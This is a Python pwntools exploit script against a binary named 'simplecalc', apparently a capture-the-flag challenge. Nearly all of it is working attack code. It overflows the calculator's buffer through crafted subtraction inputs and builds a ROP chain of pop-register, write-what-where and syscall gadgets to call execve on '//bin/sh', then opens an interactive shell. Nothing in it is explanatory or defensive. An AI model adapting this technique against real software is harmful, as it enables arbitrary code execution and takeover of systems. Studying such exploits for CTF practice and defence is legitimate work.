from pwn import *

pwn = process('./simplecalc')
#gdb.attach(pwn, '''
#break main
#''')

seed_no = 4294967295

pwn.recvuntil("number of calculations: ")
num_of_calcs = 50
pwn.sendline(str(num_of_calcs))

counter = 0
while counter < 17:
	pwn.recvuntil("=> ")
	pwn.sendline("2")
	pwn.recvuntil("Integer x: ")
	pwn.sendline("1095896585")
	pwn.recvuntil("Integer y: ")
	pwn.sendline("1095896585")
	counter += 1

# start of ROP chain

########### OBJECTIVE 1 -- GET 0x06cc40 into RSI ###############
gadget1 = 0x00401c87 # pop rsi; ret;

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")	

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget1 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

gadget2 = 0x6c2c40 # .bss section we want in RSI

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget2 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

########### OBJECTIVE 2 -- GET //bin/sh into RAX ###############

gadget3 = 0x0044db34 # pop rax; ret;

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")	

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget3 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

# //bin/sh == 0x2f2f62696e2f7368

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")	

gadget4 = 0x69622f2f
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget4 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

gadget5 = 0x68732f6e
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget5 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

########### OBJECTIVE 3 -- EXECUTE WWW GADGET ###############

gadget6 = 0x00470f11 # mov qword ptr [rsi], rax; ret;

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget6 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

########## OBJECTIVE 4 -- GET 0x3b INTO RAX ################
gadget7 = 0x0044db34 # pop rax; ret;	

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget7 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

gadget8 = 0x3b

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget8 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

########## OBJECTIVE 5 -- GET 0x006c2c40 INTO RDI ################
gadget9 = 0x0000401b73 # pop rdi; ret;

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget9 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

gadget10 = 0x006c2c40

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget10 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

########## OBJECTIVE 6 -- GET 0x0 INTO RSI ################
gadget11 = 0x00401c87 # pop rsi; ret;

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget11 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

########## OBJECTIVE 6 -- CALL SYSCALL ################
gadget12 = 0x004648e5 # syscall; ret;

# NULL * 0x4
pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline("1095896585")
pwn.recvuntil("Integer y: ")
pwn.sendline("1095896585")

pwn.recvuntil("=> ")
pwn.sendline("2")
pwn.recvuntil("Integer x: ")
pwn.sendline(str(seed_no))
plug_in = seed_no - gadget12 
pwn.recvuntil("Integer y: ")
pwn.sendline(str(plug_in))

########### TRIGGER EXPLOIT ###############
pwn.recvuntil("=> ")
pwn.sendline("5")

pwn.interactive()
